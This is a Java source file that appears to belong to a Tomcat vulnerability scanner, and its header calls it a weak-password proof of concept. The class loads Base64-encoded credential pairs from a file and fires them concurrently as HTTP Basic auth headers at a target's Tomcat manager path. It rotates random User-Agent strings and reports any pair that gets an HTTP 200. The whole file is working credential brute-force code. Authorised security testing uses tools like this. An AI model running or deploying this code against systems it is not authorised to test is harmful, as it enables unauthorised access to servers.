package org.dudu.TomcatVuln.Check;

import lombok.extern.slf4j.Slf4j;
import org.dudu.TomcatVuln.Common;
import org.dudu.TomcatVuln.DTO.PasswordRequestDTO;
import org.dudu.TomcatVuln.DTO.ResultDTO;
import org.dudu.TomcatVuln.Enum.Status;
import org.dudu.TomcatVuln.Enum.VulnName;
import org.dudu.TomcatVuln.Interface.strategy.ExecuteStrategy;
import org.dudu.TomcatVuln.request.HttpRequest;
import org.dudu.TomcatVuln.utils.FileUtil;
import org.dudu.TomcatVuln.utils.UserAgentUtil;
import org.dudu.TomcatVuln.view.MainMenuView;

import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.Base64;
import java.util.List;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.Future;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicReference;


/**
 * @description: 弱口令POC
 * @author：DUDU
 * @date: 2023/9/27
 **/
@Slf4j
public class PasswordVuln extends HttpRequest<PasswordRequestDTO, Integer> implements ExecuteStrategy<String> {
    private  boolean flag= false;
    private  String payload = null;
    @Override
    public String mark() {
        return "password";
    }

    @Override
    public String execute(String url)  {
        List<Future<?>> futures = new ArrayList<>();
        String result;
        ResultDTO resultDTO;
        List<ResultDTO> resultDTOList = MainMenuView.ResultMap.getOrDefault(url,new ArrayList<>());
        try {
            List<String> base64Str = FileUtil.getBase64Str();
            for(String base64:base64Str) {
                Future<?> futureTask  = Common.POOL.submit(() -> {
                        int respCode = request(new PasswordRequestDTO(url + Common.MANAGERNAME, base64));
                        log.info(Integer.toString(respCode)+new String(Base64.getDecoder().decode(base64)));
                        if (respCode == 200) {
                            flag = true;
                            payload = base64;
                        }
                });
                futures.add(futureTask);
            }
            for(Future<?> futureTask : futures) {
                futureTask.get();
            }
        } catch (IOException e) {
            return "[-] 文件路径有误";
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
        if(flag){
            result = "[++] 存在漏洞， 认证用户名与密码"+ new String(Base64.getDecoder().decode(payload));
            resultDTO = ResultDTO.builder().vulnName(VulnName.PasswordVuln)
                    .status(Status.SUCCESS)
                    .auth(payload).build();
            resultDTOList.add(resultDTO);
            MainMenuView.ResultMap.put(url,resultDTOList);
        }else {
            resultDTO = ResultDTO.builder().vulnName(VulnName.PasswordVuln)
                    .status(Status.FAIL).build();
            resultDTOList.add(resultDTO);
            MainMenuView.ResultMap.put(url,resultDTOList);
            result = "[-] 不存在弱口令认证漏洞";
        }

        return result;
    }
    @Override
    protected Integer request(PasswordRequestDTO passwordRequestDTO) {
        HttpURLConnection urlConnection = null;
        try {
            URL url = new URL(passwordRequestDTO.getUrl());
            urlConnection = (HttpURLConnection)url.openConnection();
            urlConnection.setRequestMethod("GET");
            urlConnection.setRequestProperty("Authorization","Basic "+passwordRequestDTO.getBase64_content());
            urlConnection.setConnectTimeout(5000); //请求超时时间
            urlConnection.setRequestProperty("Accept","*/*");
            urlConnection.setRequestProperty("Connection","close");
            urlConnection.setRequestProperty("Accept-Language","en");
            urlConnection.setRequestProperty("User-Anget", UserAgentUtil.getRandomUserAgent());
            urlConnection.setUseCaches(false);
            urlConnection.connect();
            return  urlConnection.getResponseCode();
        } catch (IOException e) {
            throw new RuntimeException(e);
        }finally {
            urlConnection.disconnect();
        }
    }

}
